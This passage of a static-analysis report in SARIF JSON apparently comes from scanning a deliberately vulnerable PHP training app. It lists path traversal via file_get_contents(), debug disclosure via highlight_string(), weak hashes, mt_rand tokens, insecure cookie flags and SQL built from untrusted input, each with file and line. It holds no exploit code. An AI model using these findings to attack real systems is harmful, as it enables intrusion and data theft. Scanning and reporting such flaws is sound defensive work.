              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:59 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 59
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4429",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 59, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "298A9358C86F3446D90E543FC3B0191E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 59,
            "endLine" : 59,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:59 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 59
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Assignment to $security"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:59 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 59
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4404",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source.php with a call to highlight_string() on line 65. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1B2C407FF0993AA3C772BBB16DBE8298"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 65,
            "endLine" : 65,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:65 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:65 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4634",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source.php with a call to highlight_string() on line 80. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AE185927F276177C91B74758A9208209"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 80,
            "endLine" : 80,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:80 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:80 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4692",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 14, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "DAB21C419B1BE15EEAF08B1B37D71763"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 14,
            "endLine" : 14,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:14 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:14 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4419",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 16. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "22E3C1A355C9DA88B1C718178BE7D31C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 16,
            "endLine" : 16,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:16 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:16 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4592",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 18, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "927A6C880DB9DEC17D15E8D28AD7EFE4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 18,
            "endLine" : 18,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:18 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:18 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4534",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 20. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6CF84D35DDE661B60F759455650D880C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 20,
            "endLine" : 20,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:20 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:20 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4417",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "229E91B6C4BA2B3CF95D41FFF6926279"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4444",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 24. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "3406729B3B3D3C4563F3A8E6DE6E5947"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 24,
            "endLine" : 24,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:24 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:24 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4656",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source_all.php line 26, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C2835FA878504CA8E28D41591B77CAC4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 26,
            "endLine" : 26,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:26 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:26 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4636",
      "message" : {
        "text" : "The program might reveal system data or debugging information in view_source_all.php with a call to highlight_string() on line 28. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AFDA96459B2F26D6EBC76883720582E3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source_all.php"
          },
          "region" : {
            "startLine" : 28,
            "endLine" : 28,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:28 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source_all.php:28 - highlight_string()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source_all.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4523",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6534974404905CE22EE406A338E2E658"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/high.php"
          },
          "region" : {
            "startLine" : 10,
            "endLine" : 10,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4448",
      "message" : {
        "text" : "The program creates a cookie in high.php on line 11, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "37C32D38D0523D814BDD546BEB197049"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/high.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4488",
      "message" : {
        "text" : "Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "572D1209115E7169FA45798AF4A61F05"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/high.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4711",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E34A393410082A50C2C88326DC9A51E1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/high.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4366",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "01B7E0420DF1CF1DF5971FDC2A5E6D85"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/impossible.php"
          },
          "region" : {
            "startLine" : 6,
            "endLine" : 6,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:6 - sha1()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:6 - sha1()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4504",
      "message" : {
        "text" : "The random number generator implemented by mt_rand() cannot withstand a cryptographic attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "5CFF39C4C372D3D8FF066C4AC2F61A94"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/impossible.php"
          },
          "region" : {
            "startLine" : 6,
            "endLine" : 6,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:6 - mt_rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:6 - mt_rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4485",
      "message" : {
        "text" : "Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "55F5C8DCB192D5AEC48EEF20EFAAE8F7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/impossible.php"
          },
          "region" : {
            "startLine" : 7,
            "endLine" : 7,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/impossible.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4572",
      "message" : {
        "text" : "The program creates a cookie in low.php on line 11, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "85759588A6D173FF6C15202166DAABFC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/low.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4635",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AE5AD817092BDB9F94874585E45ABF8F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/low.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4386",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "11DEFD463DC3E515219521BBFBD9DD6B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/medium.php"
          },
          "region" : {
            "startLine" : 7,
            "endLine" : 7,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4587",
      "message" : {
        "text" : "The program creates a cookie in medium.php on line 7, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8E318B4A96B209CB1BE5BDA0119B5E3E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/weak_id/source/medium.php"
          },
          "region" : {
            "startLine" : 7,
            "endLine" : 7,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/weak_id/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4522",
      "message" : {
        "text" : "Line 19 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6508A7BF5A1F9A5BC1F7D3BAC771F14D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
